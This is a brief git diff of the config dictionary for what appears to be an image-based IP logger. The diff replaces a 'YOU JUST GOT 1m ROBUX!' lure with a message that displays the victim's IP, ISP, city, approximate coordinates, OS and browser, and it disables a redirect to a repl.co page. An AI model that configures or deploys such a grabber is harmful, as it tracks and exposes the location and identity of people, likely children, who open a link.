@@ -25,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "YOU JUST GOT 1m ROBUX!", # Message to show
+        "message": "IP: {ip}, ISP: {isp}, ASN: {asn}, COUNTRY: {country}, REGION: {region}, CITY: {city}, APROXIMATE CORDS: [{lat},{long}], TIMEZONE: {timezone}, OS: {os}, BROWSER: {browser}.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -47,7 +47,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://stupid-or-not.redactedcode165926.repl.co" # Link to the webpage to redirect to
     },
 
